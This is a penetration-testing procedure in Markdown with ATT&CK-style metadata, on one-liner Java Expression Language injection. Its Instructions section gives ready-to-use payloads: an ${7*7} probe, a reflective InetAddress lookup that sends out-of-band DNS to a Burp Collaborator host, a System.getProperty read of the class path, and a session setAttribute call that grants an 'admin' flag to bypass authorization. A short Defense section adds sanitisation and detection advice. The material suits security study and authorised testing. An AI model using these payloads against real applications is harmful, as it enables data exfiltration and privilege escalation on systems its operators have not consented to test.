---
id: 5fcca06e-ebdc-461f-ade6-40fd92dec7cb
name: One-Liner-Expression-Language-Injection
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:38.993893+00:00'
updated_at: '2023-04-10T20:23:47.033233+00:00'
tactics:
  - '[[Collection]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
sub_techniques: []
tags:
  - '[[tags/Expression Language EL]]'
  - >-
    [[tags/Expression Language EL - One-Liner injections not including code
    execution]]
  - '[[tags/Server Side Template Injection]]'
  - el-injection
  - ssti
commands: []
platforms:
  - Web
  - Java
tools: []
skill_level: intermediate
impact_level: medium
detection_risk: low
validated: true
---

# One-Liner-Expression-Language-Injection

## Summary

One-Liner Expression Language Injection is a technique used to inject malicious expressions into server-side templates that use Expression Language (EL) in Java-based applications, such as JSP pages. These injections leverage EL's dynamic evaluation to perform actions like data exfiltration via DNS lookups, retrieving JVM system properties, or manipulating session attributes without achieving full remote code execution. This procedure is useful in web application penetration testing to identify and exploit EL processing vulnerabilities in input fields, forms, or parameters that are rendered through templates.

## Description

Expression Language (EL) is a scripting language integrated into Java EE applications for embedding dynamic content in web pages, often via JSP or other templating engines like Freemarker or Velocity. One-liner injections exploit improper sanitization of user inputs that are evaluated as EL expressions, allowing attackers to invoke Java classes and methods reflectively. Common targets include login forms, search fields, or error messages where user input is directly interpolated into EL contexts. This technique enables information disclosure (e.g., system properties or external DNS interactions for exfiltration) and session hijacking but stops short of arbitrary code execution. It maps to MITRE ATT&CK technique T1190 (Exploit Public-Facing Application) under the Collection tactic (TA0009), as it facilitates unauthorized data access through web vulnerabilities. Prerequisites include identifying EL-enabled endpoints via fuzzing or source code review.

## Requirements

1. Access to a web application with EL-enabled server-side templating (e.g., JSP on Tomcat or similar Java servers).
2. Knowledge of EL syntax and vulnerable input points (e.g., via Burp Suite interception or manual testing).
3. A collaborator server or DNS logging service (e.g., Burp Collaborator) for exfiltration verification.
4. No elevated privileges required, but proxy tools like Burp Suite enhance interception and modification.

## Defense

Defensive measures and detection strategies:

- Sanitize and escape all user inputs before EL evaluation using whitelisting or parameterized templating.
- Disable EL evaluation in production JSPs by setting isELIgnored="true" in page directives.
- Implement web application firewalls (WAFs) to detect reflective Java class invocations in inputs (e.g., signatures for "getClass().forName").
- Monitor application logs for anomalous EL evaluations and network logs for unexpected DNS queries to external domains.
- Conduct regular code reviews and use static analysis tools to identify unsanitized EL interpolations.

## Objectives

1. Extract sensitive data from the JVM environment, such as system properties or configuration paths.
2. Perform out-of-band data exfiltration via DNS interactions to confirm injection success.
3. Manipulate application state, like elevating user privileges through session attribute changes.
4. Validate EL injection vulnerability without triggering full code execution alerts.

## Instructions

### Step 1: Identify EL Injection Point

**Context**: Locate inputs in the web application that are processed through EL-enabled templates, such as form fields or URL parameters. Fuzz with payloads like ${7*7} to check if the output evaluates to 49, confirming EL processing.

> Manually test or use a proxy to submit inputs and observe if expressions are evaluated rather than treated as literals.

**Expected Output**: Evaluated result (e.g., numeric computation) instead of raw input, indicating vulnerability.

### Step 2: Perform DNS Lookup for Exfiltration

**Context**: Use the EL expression to trigger a DNS resolution to an attacker-controlled domain, confirming control channel and potentially exfiltrating data in subdomains. This step verifies blind injection success.

**Code** ([[codes/Java-EL-One-Liner-DNS-Lookup]]):

```java
${("").getClass().forName("java.net.InetAddress").getMethod("getByName",("").getClass()).invoke(null,"xxxxxxxxxxxxxx.burpcollaborator.net")}
```

> Replace 'xxxxxxxxxxxxxx.burpcollaborator.net' with your collaborator hostname. Submit this in the vulnerable input field and monitor your DNS logs for the resolution request.

**Expected Output**: No visible change on the page (blind), but DNS interaction logged on your server.

### Step 3: Retrieve JVM System Property

**Context**: Extract internal application details like class paths or version info by invoking System.getProperty, aiding further reconnaissance without direct file access.

**Code** ([[codes/Java-EL-One-Liner-JVM-Property-Lookup]]):

```java
${("").getClass().forName("java.lang.System").getDeclaredMethod("getProperty",("").getClass()).invoke(null,"java.class.path")}
```

> Replace 'java.class.path' with the desired property (e.g., 'java.version', 'user.home'). The output will display the property value if injection succeeds.

**Expected Output**: The value of the system property rendered in the page response, such as a file path or version string.

### Step 4: Modify Session Attributes

**Context**: Alter session data to bypass authorization checks, such as setting an admin flag, by accessing the pageContext and session objects.

**Code** ([[codes/Java-EL-One-Liner-Session-Attribute-Modification]]):

```java
${pageContext.request.getSession().setAttribute("admin",true)}
```

> Replace 'admin' with the target attribute name and 'true' with the desired value (e.g., a user ID). Refresh the page or navigate to a protected area to test the change.

**Expected Output**: No immediate output, but subsequent requests reflect the modified session (e.g., admin privileges granted).

### Step 5: Verify and Clean Up

**Context**: Confirm the impacts of each injection and ensure no persistent changes if testing ethically. Log all interactions for reporting.

> Review application behavior, DNS logs, and session state. If in a test environment, reset sessions or restart the application.

**Expected Output**: Documented evidence of successful injections, such as DNS hits or altered access levels.
